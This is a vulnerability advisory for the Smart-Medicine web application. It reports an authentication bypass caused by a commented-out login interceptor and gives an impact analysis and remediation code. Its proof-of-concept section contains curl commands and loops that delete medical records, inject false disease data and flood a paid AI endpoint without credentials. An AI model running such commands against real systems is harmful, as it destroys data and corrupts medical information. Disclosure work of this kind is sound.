# Authentication Bypass Vulnerability in Smart-Medicine System

## Vulnerability Overview

**Vulnerability Type**: Authentication Bypass / Broken Authentication

**Affected Software**: Smart-Medicine (智慧医药系统)

**Affected Versions**: All versions up to and including the current release (commit: cc3ec30)

**Severity**: Critical

**CVSS v3.1 Score**: 9.1 (Critical)

**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Discoverer**: sh7err@vEcho

**Vendor**: XueWei (薛伟同学)

**Vendor Website**: http://xuewei.world

**Repository**: https://github.com/xw213400/smart-medicine

## Vulnerability Description

The Smart-Medicine system contains a critical authentication bypass vulnerability due to the login interceptor configuration being completely commented out in the source code. This allows unauthenticated attackers to directly access and manipulate administrative functions without any credentials.

The root cause lies in `src/main/java/world/xuewei/config/MvcConfig.java` where the entire `addInterceptors()` method is commented out (lines 48-61), effectively disabling all authentication checks throughout the application.

```java
// MvcConfig.java (lines 48-61)
//    @Override
//    public void addInterceptors(InterceptorRegistry registry) {
//        registry.addInterceptor(new LoginHandlerInterceptor())
//                .addPathPatterns("/**")
//                .excludePathPatterns(
//                        "/","/index","/index.html","/join.html","/home","/material","/materials","/admin/**",
//                        "/login","/register",
//                        "/error400Page","/error401Page","/error404Page","/error500Page",
//                        "/**/front/**", "/asserts/**","/**/*.css", "/**/*.js", "/**/*.png ",
//                        "/**/*.jpg", "/**/*.jpeg","/**/*.gif", "/**/fonts/*", "/**/*.svg");
//    }
```

## Technical Details

### Affected Components

The vulnerability affects all REST API endpoints in the BaseController class and its subclasses:

- `src/main/java/world/xuewei/controller/BaseController.java`
  - `@PostMapping("save")` - Line 77
  - `@PostMapping("/delete")` - Line 93

- All controllers extending BaseController:
  - `IllnessController.java`
  - `MedicineController.java`
  - `FeedbackController.java`
  - `IllnessKindController.java`
  - `IllnessMedicineController.java`

### Attack Vector

An attacker can exploit this vulnerability by:

1. Directly sending HTTP POST requests to administrative endpoints without authentication
2. No special tools or techniques required - simple curl commands are sufficient
3. Network-accessible attack vector - can be exploited remotely over the internet

### Exploitation Requirements

- Network access to the vulnerable application
- No authentication required
- No user interaction required
- Low attack complexity

## Proof of Concept

### Example 1: Delete All Disease Records

```bash
# Delete disease record with ID 1 without authentication
curl -X POST "http://target-host/illness/delete" \
  -d "id=1"

# Response:
# {"code":"SUCCESS","message":"删除成功"}
```

### Example 2: Inject Malicious Medical Information

```bash
# Add fake disease information without authentication
curl -X POST "http://target-host/illness/save" \
  -d "illnessName=Fake Disease&illnessSymptom=Fake Symptoms&includeReason=Fake Causes"

# Response:
# {"code":"SUCCESS","message":"保存成功","data":{...}}
```

### Example 3: Mass Data Deletion

```bash
# Batch delete all medicine records (IDs 1-100)
for id in {1..100}; do
  curl -X POST "http://target-host/medicine/delete" -d "id=$id"
done
```

### Example 4: Abuse AI API (Cost Attack)

```bash
# Repeatedly call the AI API without authentication
# This can cause significant financial damage
for i in {1..1000}; do
  curl -X POST "http://target-host/message/query" \
    -d "content=test query"
done
```

## Impact Analysis

### Data Integrity Impact: HIGH

- Unauthenticated attackers can create, modify, or delete:
  - Disease information (medical encyclopedia data)
  - Medicine information (drug database)
  - Disease classifications
  - User feedback records

### Business Impact: CRITICAL

1. **Medical Data Tampering**: Attackers can inject false medical information, potentially leading to:
   - Patients receiving incorrect medical advice
   - Damage to the platform's credibility
   - Legal liability issues

2. **Service Disruption**: Mass deletion of data can render the system unusable

3. **Financial Loss**:
   - Abuse of AI API (Alibaba Tongyi Qianwen) can result in significant API costs
   - Cost of data recovery and system restoration

4. **Regulatory Compliance**:
   - Violation of medical information management regulations
   - Potential HIPAA-like compliance issues in healthcare contexts

### Confidentiality Impact: MEDIUM

While the vulnerability primarily affects data integrity, it also allows unauthorized access to:
- User feedback information
- System configuration data

### Availability Impact: MEDIUM

Attackers can:
- Delete critical system data
- Exhaust API quotas
- Cause system malfunction through data corruption

## Affected Endpoints

The following endpoints can be accessed without authentication:

| Endpoint | Method | Function | Impact |
|----------|--------|----------|--------|
| `/illness/save` | POST | Create/Update disease | Data tampering |
| `/illness/delete` | POST | Delete disease | Data loss |
| `/medicine/save` | POST | Create/Update medicine | Data tampering |
| `/medicine/delete` | POST | Delete medicine | Data loss |
| `/feedback/save` | POST | Create/Update feedback | Data tampering |
| `/feedback/delete` | POST | Delete feedback | Data loss |
| `/illnessKind/save` | POST | Update disease category | Data tampering |
| `/illnessKind/delete` | POST | Delete disease category | System disruption |
| `/illnessMedicine/save` | POST | Update relationships | Data corruption |
| `/illnessMedicine/delete` | POST | Delete relationships | Data corruption |
| `/message/query` | POST | Query AI API | Financial loss |

## Recommendations

### Immediate Actions (P0 - Critical)

1. **Enable Authentication Interceptor**

Uncomment the interceptor configuration in `MvcConfig.java`:

```java
@Override
public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(new LoginHandlerInterceptor())
            .addPathPatterns("/**")
            .excludePathPatterns(
                    "/", "/index.html", "/login", "/register",
                    "/findIllness", "/findIllnessOne", "/findMedicineOne", "/findMedicines",
                    "/asserts/**", "/**/*.css", "/**/*.js", "/**/*.png", "/**/*.jpg"
            );
}
```

2. **Add Method-Level Authorization Checks**

Modify `BaseController.java` to verify authentication:

```java
@PostMapping("save")
public RespResult save(T obj) {
    // Add authentication check
    if (Assert.isEmpty(loginUser)) {
        return RespResult.fail("Authentication required");
    }

    // Add authorization check for admin operations
    if (loginUser.getRoleStatus() != 1) {
        return RespResult.fail("Insufficient privileges");
    }

    obj = service.save(obj);
    return RespResult.success("保存成功", obj);
}
```

### Short-Term Actions (P1)

3. **Implement Rate Limiting**: Add rate limiting for API endpoints, especially `/message/query`

4. **Add Audit Logging**: Log all administrative operations for forensics

5. **Security Review**: Conduct a comprehensive security audit of all endpoints

### Long-Term Actions (P2)

6. **Adopt Security Framework**: Consider using Spring Security for robust authentication/authorization

7. **Implement RBAC**: Proper role-based access control system

8. **Security Testing**: Integrate automated security testing in CI/CD pipeline

## Timeline

- **2025-11-10**: Vulnerability discovered during security code audit
- **2025-11-10**: Vulnerability verified and confirmed exploitable
- **2025-11-10**: CVE request initiated

## References

- Project Repository: https://github.com/xw213400/smart-medicine
- Author's Blog: http://xuewei.world
- Vulnerable Code: `src/main/java/world/xuewei/config/MvcConfig.java:48-61`

## Credits

**Discoverer**: sh7err@vEcho

**Contact**: [Contact information available upon request]

## Disclaimer

This vulnerability report is provided for educational and security research purposes. The discoverer has responsibly disclosed this vulnerability and followed ethical security research practices. No malicious exploitation was performed during the research.

---

**Report Version**: 1.0

**Last Updated**: 2025-11-10
